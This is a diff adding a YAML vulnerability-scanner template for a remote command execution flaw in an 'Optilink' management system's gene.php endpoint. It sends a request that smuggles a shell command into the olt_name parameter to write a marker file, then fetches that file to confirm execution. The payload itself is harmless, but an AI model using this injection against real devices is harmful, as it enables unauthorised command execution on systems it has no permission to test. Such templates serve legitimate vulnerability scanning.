@@ -1,0 +1,31 @@
+id: Optilink-gene-rce
+
+info:
+  name: Optilink管理系统 gene.php 存在远程命令执行漏洞
+  author: Optilink
+  severity: critical
+  tags: Optilink
+
+http:
+  - raw:
+      - |+
+        GET /cgi/fsystem/gene.php?olt_op=1&olt_name=;echo+{{randstr}}>%20test112test.txt;%20%23%20 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept-Language: zh-CN
+
+      - |+
+        GET /cgi/fsystem/test112test.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept-Language: zh-CN
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body_2
+        words:
+          - '{{randstr}}'
+    matchers-condition: and
